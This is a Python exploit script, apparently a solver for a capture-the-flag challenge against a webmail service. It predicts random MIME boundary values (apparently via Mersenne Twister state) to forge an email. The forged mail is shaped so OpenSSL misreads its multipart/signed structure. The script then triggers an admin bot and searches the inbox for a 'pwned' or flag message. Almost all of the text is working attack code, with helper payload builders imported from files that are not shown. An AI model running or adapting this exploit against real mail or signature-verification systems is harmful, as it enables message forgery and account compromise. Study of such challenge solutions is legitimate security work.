"""Final live attempt on the current instance.

Alignment (verified from the diagnostic reply): next MT call == preds[NEXT].
  oracle mail   -> preds[NEXT]
  exploit mail  -> preds[NEXT+1]
  bot reply     -> inner preds[NEXT+2], outer preds[NEXT+3]
"""
import sys, os, json, re, time, http.client
from urllib.parse import urlparse
sys.path.insert(0, r'.')
from _z_496_spec import make_D, ews, make_subj, PWN

BASE = sys.argv[1].rstrip('/')
NEXT = int(sys.argv[2])
u = urlparse(BASE)
conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=60)


def req(method, path, obj=None, token=None):
    global conn
    last = None
    for attempt in range(4):
        try:
            body = json.dumps(obj) if obj is not None else None
            hdrs = {}
            if body is not None:
                hdrs['Content-Type'] = 'application/json'
            if token:
                hdrs['token'] = token
            conn.request(method, path, body=body, headers=hdrs)
            r = conn.getresponse()
            d = r.read().decode()
            if r.status >= 400:
                raise RuntimeError('%s %s -> %s %s' % (method, path, r.status, d[:200]))
            return json.loads(d)
        except (http.client.HTTPException, ConnectionError, OSError) as e:
            last = e
            try: conn.close()
            except Exception: pass
            conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=60)
            time.sleep(0.2)
    raise last


cfg = json.load(open(r'./_z_496_remote.json'))
tok = cfg['tok']
preds = json.load(open(r'./_z_496_pred.json'))
b = lambda i: '=' * 15 + ('%019d' % preds[i]) + '=='

# --- self-align: find the current MT position with one probe send ---
pid = req('POST', '/api/send', {'to': 'user@ses', 'subject': 'align', 'body': 'b'}, tok)
em = req('GET', '/api/email/' + pid, None, tok)
got = int(re.search(r'boundary="=+(\d+)=+"', em['data']).group(1))
if got in preds:
    NEXT = preds.index(got) + 1
    print('[i] aligned: probe=%d is preds[%d] -> NEXT=%d' % (got, NEXT - 1, NEXT))
else:
    sys.exit('[!] alignment lost: %d not in preds' % got)
print('[i] NEXT=%d  B1=preds[%d]=%s  B2=preds[%d]=%s' % (NEXT, NEXT + 2, b(NEXT + 2), NEXT + 3, b(NEXT + 3)))

# --- 0. serialization check: how does the server fold the new payload? ---
dum = make_D(b(2), b(3))
eid = req('POST', '/api/send', {'to': 'user@ses', 'subject': 'Re: ' + dum, 'body': 'foldcheck'}, tok)
raw = req('GET', '/api/email/' + eid, None, tok)['data']
hdr = raw.split('\n\n', 1)[0]
ct = [l for l in hdr.split('\n') if re.match(r'(?i)^content-type\s*:', l)]
print('[i] Content-Type headers visible to OpenSSL (%d):' % len(ct))
for l in ct:
    print('     ', l[:110])
sp = [l for l in hdr.split('\n') if l.startswith(' Content-Type')]
print('[i] space-prefixed CT lines kept separate:', len(sp))
open(r'./_z_496_emls\foldcheck.eml', 'w', newline='', encoding='utf-8').write(raw)
bad = [l for l in ct if 'multipart/signed' not in l]
if bad:
    print('[!] WARNING: OpenSSL can see a non-signed Content-Type ->', bad)
else:
    print('[i] fold shape OK')

# --- 1. exploit mail ---
B1, B2 = b(NEXT + 2), b(NEXT + 3)
subj = make_subj(B1, B2, 'admin@ses')
eid = req('POST', '/api/send', {'to': 'admin@ses', 'subject': subj, 'body': 'hello'}, tok)
print('[i] exploit mail', eid, 'consumed expect preds[%d]' % (NEXT + 1), flush=True)

# --- 2. bot runs ---
for run in (1, 2):
    t0 = time.time()
    print('[i] bot run %d ->' % run, req('POST', '/api/admin_bot', None, tok),
          '%.1fs' % (time.time() - t0), flush=True)
    time.sleep(1)

# --- 3. harvest ---
for attempt in range(10):
    emails = req('GET', '/api/emails', None, tok)
    hits = []
    for k, e in emails.items():
        d = e['data']
        if re.search(r'(?i)^Subject: pwned', d) or re.search(r'(?i)Subject:.*(academy|flag|HTB|CTF)\{', d):
            hits.append((e['time'], k, d))
    if hits:
        hits.sort()
        for t, k, d in hits:
            print('=== HIT', k, '===')
            print(d[:3000])
        sys.exit(0)
    print('[i] retry %d inbox=%d' % (attempt, len(emails)), flush=True)
    time.sleep(3)
print('[-] no flag mail')
